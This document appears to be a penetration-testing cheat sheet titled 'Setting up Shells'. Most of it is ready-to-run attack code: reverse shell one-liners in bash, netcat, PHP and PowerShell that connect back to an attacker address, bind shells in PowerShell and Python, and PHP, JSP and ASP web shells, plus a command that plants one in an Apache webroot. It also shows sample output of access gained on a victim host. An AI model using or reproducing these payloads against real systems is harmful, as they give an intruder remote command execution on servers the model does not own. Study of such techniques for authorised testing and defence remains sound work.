---
description: >-
  This is a collection of few useful scripts for creating reverse, bind and web
  shells.
---

# Setting up Shells

## Reverse Shells:

### Preparing the shell script:

#### Linux target:

{% tabs %}
{% tab title="Bash" %}
```bash
$ bash -c 'bash -i >& /dev/tcp/1.1.1.1/PORT 0>&1'
# OR 
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENEING PORT> >/tmp/f
```
{% endtab %}

{% tab title="PHP" %}
```php
# To be saved in a .php file.
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.1.1.1 <LISTENEING PORT> >/tmp/f"); ?>
```
{% endtab %}
{% endtabs %}

#### Windows Target:

```powershell
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('1.1.1.1',PORT);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Setting up a listener on our attacking machine:

```bash
attacking-machine$ nc -lvnp 1234
   -l Listen mode.
   -v Verbose mode.
   -n Disable DNS resolution and only connect from/to IPs, to speed up the connection.
   -p 1234 Port number netcat is listening on.
```

### Results of the injection:

```bash
attacker@attacking-machine$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [1.1.1.1] from (UNKNOWN) [10.10.10.10] 41572

victim@target-host> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

{% hint style="success" %}
<mark style="color:green;">We successfully got a connection back now it's time to make it more stable and efficient.</mark>
{% endhint %}

### 3. Upgrading TTY:

In order to upgrade our shell to a fully TTY let's follow these steps:

1. Python/stty:

```bash
victim@target$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. Raw + Echoless  mode:

```bash
victim@target-host$ ^Z
attacker@attacking-machine$ stty raw -echo
attacker@attacking-machine$ fg
[Enter]
[Enter]
user@target$
```

{% hint style="info" %}
* <mark style="color:blue;">Raw mode:</mark> This means that characters are delivered to the application as soon as they are typed, without any line buffering or special interpretation (such as Ctrl+C for interrupt).
* <mark style="color:blue;">-echo:</mark> By turning off echoing, characters typed by the user won't be displayed on the screen.
{% endhint %}

3. Adjusting the Terminal size:

```bash
victim@target-host$ export TERM=xterm-256color
victim@target-host$ stty rows 67 columns 318
```

{% hint style="success" %}
<mark style="color:green;">Now we can use the full terminal features.</mark>
{% endhint %}

## Bind shells:

### Listener on the target machine:

#### Linux Target:

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

#### Windows target:

{% tabs %}
{% tab title="PowerShell" %}
```powershell
$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
{% endtab %}

{% tab title="Python" %}
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
{% endtab %}
{% endtabs %}

### Connecting to the target:

```bash
$ nc 10.10.10.10 1234
# Successful connection a shell is now open:
victim@target-host> id # our command
uid=33(www-data) gid=33(www-data) groups=33(www-data) # server response
```

{% hint style="success" %}
We <mark style="color:green;">successfully</mark> got a remote shell on the target machine. If it isn't an unstable and "featureless" terminal, we can upgrade to a full TTY as in the [Reverse shells paragraph](setting-up-shells.md#id-1.-reverse-shells).
{% endhint %}

## Web Shells:

### Preparing the shell script:

{% tabs %}
{% tab title="PHP" %}
```php
<?php system($_REQUEST["cmd"]); ?>
```
{% endtab %}

{% tab title="Java" %}
```java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
{% endtab %}

{% tab title="ASP" %}
```aspnet
<% eval request("cmd") %>

```
{% endtab %}
{% endtabs %}

### Injecting to the webroot:

<table><thead><tr><th>Web Server</th><th align="center">Default Webroot</th><th data-hidden align="center"></th></tr></thead><tbody><tr><td>Apache</td><td align="center">/var/www/html/</td><td align="center"></td></tr><tr><td>Nginx</td><td align="center">/usr/local/nginx/html/</td><td align="center"></td></tr><tr><td>IIS</td><td align="center">c:\inetpub\wwwroot\</td><td align="center"></td></tr><tr><td>XAMPP</td><td align="center">C:\xampp\htdocs\</td><td align="center"></td></tr></tbody></table>

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a <mark style="color:red;">**Linux host running Apache**</mark>, we can write a **PHP** shell with the following command:

```bash
$ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Execution:

1. Visit the shell.php page on the compromised website, and use `?cmd=id` to execute the `id` command:\
   `http://SERVER_IP:PORT/shell.php?cmd=id`\
   We'll get the result of the `id` command on the web page!&#x20;
2. Or Use `curl` command: `$ curl http://SERVER_IP:PORT/shell.php?cmd=id`

